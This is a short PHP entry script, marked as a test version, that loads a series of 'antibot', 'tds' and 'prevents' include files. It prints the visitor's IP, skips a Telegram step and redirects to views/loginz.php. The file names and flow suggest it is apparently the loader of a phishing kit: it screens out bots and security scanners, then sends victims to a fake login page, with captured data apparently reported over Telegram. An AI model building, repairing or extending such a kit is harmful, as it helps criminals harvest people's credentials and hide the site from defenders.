<?php
// Simplified test version
echo "Starting application...<br>";

// Test includes one by one
echo "Testing includes...<br>";

echo "1. Testing antibot.php...<br>";
require './antibot.php';
echo "antibot.php loaded<br>";

echo "2. Testing genius.php...<br>";
require './prevents/genius.php';
echo "genius.php loaded<br>";

echo "3. Testing tds.php...<br>";
include './antibot/tds.php';
echo "tds.php loaded<br>";

echo "4. Testing anti.php...<br>";
include './prevents/anti.php';
echo "anti.php loaded<br>";

echo "5. Testing anti2.php...<br>";
include './prevents/anti2.php';
echo "anti2.php loaded<br>";

echo "6. Testing sub_anti.php...<br>";
include './prevents/sub_anti.php';
echo "sub_anti.php loaded<br>";

echo "7. Testing block.php...<br>";
include './prevents/block.php';
echo "block.php loaded<br>";

echo "All includes successful!<br>";

// Test basic functionality
$ip = $_SERVER['REMOTE_ADDR'];
echo "IP: $ip<br>";

// Skip Telegram for now
echo "Skipping Telegram for testing...<br>";

// Redirect to login
echo "Redirecting to login...<br>";
header("Location: views/loginz.php");
exit;
?>
